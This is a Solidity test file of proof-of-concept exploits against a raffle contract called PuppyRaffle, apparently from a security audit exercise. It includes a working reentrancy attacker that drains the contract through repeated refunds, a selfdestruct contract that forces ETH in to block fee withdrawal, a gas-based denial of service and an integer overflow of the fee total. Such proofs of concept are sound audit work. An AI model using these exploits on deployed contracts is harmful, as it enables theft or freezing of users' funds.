// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {PuppyRaffleTest, PuppyRaffle, console} from "../../test/PuppyRaffleTest.t.sol";

///////////////////////////////////////////////////////////////////////////////////
///////////////////// Reentrancy attack contract //////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;

    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players); // enter
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex); // immediately refund, this refund will call back this contract, to the receive / fallback function
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex); // call this until we empty the Raffle contact's balance
        }
    }

    receive() external payable {
        _stealMoney();
    }

    fallback() external payable {
        _stealMoney();
    }
}

///////////////////////////////////////////////////////////////////////////////////
///////////////////// Selfdesctucting contract   //////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////

contract SelfDesctructMe {
    PuppyRaffle puppyRaffle;

    address public owner;
    address public forceEthTo;

    constructor(address _forceEthTo) {
        owner = msg.sender;
        forceEthTo = _forceEthTo;
    }

    function destroy() external {
        require(msg.sender == owner, "Only the owner can destroy this contract.");
        selfdestruct(payable(forceEthTo));
    }
}

///////////////////////////////////////////////////////////////////////////////////
///////////////////// PoC test codes   ////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////

contract ProofOfCodes is PuppyRaffleTest {
    // block gas limit is 30 million on ethereum BUT in a local testing environment it is not stricly enforced for convenience.
    // So this is not a feasible way to test DoS.
    function test_denialOfService_b() public {
        uint256 playersNum = 100000;
        address[] memory players = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(uint160(i + 1)); // use dummy addresses
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
    }

    function test_denialOfService_a() public {
        vm.txGasPrice(1); // FOundry cheat code for setting gas price to 1 (to avoid any funny business)

        // let the first 100 players enter
        uint256 playersNum = 100;
        address[] memory players1stBatch = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players1stBatch[i] = address(uint160(i)); // use dummy addresses
        }

        // see how much gas it costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players1stBatch.length}(players1stBatch);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players is ", gasUsedFirst);

        // let the 2nd 100 players enter
        address[] memory players2ndBatch = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players2ndBatch[i] = address(uint160(i + playersNum)); // use dummy addresses, address 100, 101...
        }

        // see how much gas it costs
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players2ndBatch.length}(players2ndBatch);
        gasEnd = gasleft();
        uint256 gasUsedSecond = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the 2nd 100 players is ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

    function test_firstPlayerAppearsInactiveEvenIfEntered() public {
        // player 0 enters
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        // check whether active
        uint256 inactiveIndicator = 0;
        uint256 activeOrNot = puppyRaffle.getActivePlayerIndex(playerOne);

        assertEq(activeOrNot, inactiveIndicator);
    }

    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);

        address attackUser = makeAddr("attackUser");
        // deal money to the attacker so it can enter the raffle
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackerBalance = address(attackerContract).balance;
        uint256 startingRaffleBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        uint256 finalAttackerBalance = address(attackerContract).balance;
        uint256 finalRaffleBalance = address(puppyRaffle).balance;

        console.log("Starting attacker contract balance: ", startingAttackerBalance);
        console.log("Starting raffle contract balance: ", startingRaffleBalance);
        console.log("Final attacker contract balance: ", finalAttackerBalance);
        console.log("Final raffle contract balance: ", finalRaffleBalance);
    }

    function test_totalFeesOverflow() public {
        // original entrance fee is 1e18
        // max value of uint64 is 18446744073709551615

        uint256 uint64MaxValue = type(uint64).max; // 18446744073709551615
        uint256 playerNumWoOverflow = uint64MaxValue / ((entranceFee * 20) / 100);
        uint256 playersNum = playerNumWoOverflow; // 92

        // create 2 batches of players
        address[] memory players1stBatch = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players1stBatch[i] = address(uint160(i)); // use dummy addresses
        }

        playersNum = 4;
        address[] memory players2ndBatch = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players2ndBatch[i] = address(uint160(i + playersNum)); // use dummy addresses
        }

        // let the 1st batch enter the game
        puppyRaffle.enterRaffle{value: entranceFee * players1stBatch.length}(players1stBatch);
        // advance time with 1 day so the raffle duration is over
        vm.warp(block.timestamp + duration + 1);
        // select winner (totalFees is calculated in this function, increases from raffle to raffle until withdrawn)
        puppyRaffle.selectWinner();
        // check totalFees after 1st batch
        uint64 totalFeesAfter1stBatch = puppyRaffle.totalFees();

        // let the second batch of players enter
        puppyRaffle.enterRaffle{value: entranceFee * players2ndBatch.length}(players2ndBatch);
        // advance time with 1 day so the raffle duration is over
        vm.warp(block.timestamp + duration + 1);
        // select winner (totalFees is calculated in this function, increases from raffle to raffle until withdrawn)
        puppyRaffle.selectWinner();
        // check totalFees after 1st batch
        uint64 totalFeesAfter2ndBatch = puppyRaffle.totalFees();

        console.log("Total fees after the first batch of entrants: ", totalFeesAfter1stBatch);
        console.log("Total fees after the second batch of entrants: ", totalFeesAfter2ndBatch);

        assert(totalFeesAfter2ndBatch < totalFeesAfter1stBatch);

        // We are also unable to withdraw any fees because of the require check expects a strong equality which breaks due to the overflow
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    /*function test_cannotWithdraw() public playersEntered {
        uint256 oneDay = 1 days;
        vm.warp(block.timestamp + oneDay + 1);
        puppyRaffle.selectWinner();
        console.log("Total protocol fees: ", puppyRaffle.totalFees());
        puppyRaffle.withdrawFees();
    }*/

    function test_cantSendEthToPuppyContract() public {
        address moneySender = makeAddr("sender");
        vm.deal(moneySender, 1 ether);
        vm.expectRevert();
        vm.prank(moneySender);
        (bool success,) = payable(address(puppyRaffle)).call{value: 1 ether}("");
        //require(success); is this needed?
    }

    function test_mishandlingOfEth() public playersEntered {
        // conclude the first raffle with 4 players
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();

        // check the collected protocol fees
        uint256 totalFees = puppyRaffle.totalFees();
        console.log("Protocol fees collected: ", totalFees);
        assertEq(totalFees, address(puppyRaffle).balance);

        address ethForcer = makeAddr("ethForcer"); // address which will deploy the self-destroying contract
        SelfDesctructMe selfdestructMe;
        vm.prank(ethForcer);
        selfdestructMe = new SelfDesctructMe(address(puppyRaffle)); // deploy the self-destructing contract
        vm.deal(address(selfdestructMe), 1 ether); // give 1 ETH the self-desctructing contract
        vm.prank(ethForcer);
        selfdestructMe.destroy(); // destroy and, meanwhile, force ETH to PuppyRaffle

        assert(totalFees <= address(puppyRaffle).balance);

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
